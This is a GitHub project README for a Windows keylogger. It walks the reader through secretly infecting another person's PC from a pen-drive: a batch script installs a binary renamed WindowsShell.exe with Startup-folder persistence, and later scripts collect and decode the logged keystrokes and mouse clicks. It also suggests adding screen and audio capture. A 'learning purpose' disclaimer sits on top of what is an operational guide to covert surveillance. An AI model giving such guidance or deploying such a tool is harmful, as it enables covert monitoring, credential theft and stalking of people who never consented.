#### A Terrific Keystroke Recorder

This tacky program hides itself in the subjectâ€™s PC (Windows XP or later), and silently records all keyboard and mouse operations. It is launched automatically with PC start, then stores data in ASCII code with record-date. Now all you have to do is- collect the record, and decode it.

**This project is created only for learning purpose.**

### How to use?

1. Download the full package from [here](https://github.com/MinhasKamal/StupidKeylogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look something like this-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger"/>
 </div>

 **WindowsShell.exe** is the compiled and renamed form of [**Keylogger.cpp**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/Keylogger.cpp). Of course you do not expect others to let you insert a pen-drive containing keylogger; even if that is stupid! **WindowsShell** is the link file of **WindowsShell.exe**. 

2. Insert your pen-drive in a computer and run **Infect.bat**. This will install **WindowsShell.exe** (in the *%appdata%* folder) & **WindowsShell.lnk** (in *%appdata%\Microsoft\Windows\Start Menu\Programs\Startup*) in that PC, and start it. 

3. Wait for some days (I know it is hard but be patient), then return to the PC, insert the pen-drive and run **CollectData.bat**. You will get a file named **Record.log**. This is what it contains-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20914395/89d6b268-bba9-11e6-9586-dae692aa0405.png" alt="Record" width="600px" height=auto />
 </div>

4. Now, simply run **RecordDecoder.exe** (keep **Record.log** in the same folder & do not rename it), and you will get **Data.log**. This file contains all the key-strokes and mouse-clicks. It is all up to you now to find necessary information from this (good luck with that!). 

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20915077/d9e3ffbe-bbad-11e6-87f1-d7c079c3cfb7.png" alt="Data" width="600px" height=auto />
 </div>

 You may use [**RecordDecoderFocused**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/RecordDecoderFocused.cpp) instead of **RecordDecoder.exe**, it will get rid of some unnecessary data automatically for you.

5. If you want to remove the Keylogger from that PC, run **Cure.bat**.

Surely you can use it in many other ways; and also enhance its ability by adding a screen capturer, or sound recorder, and so on.

**Note:** *I will not take any responsibility of someone else's ill act with my program*. But I do believe that a real learner will learn a lot from this.
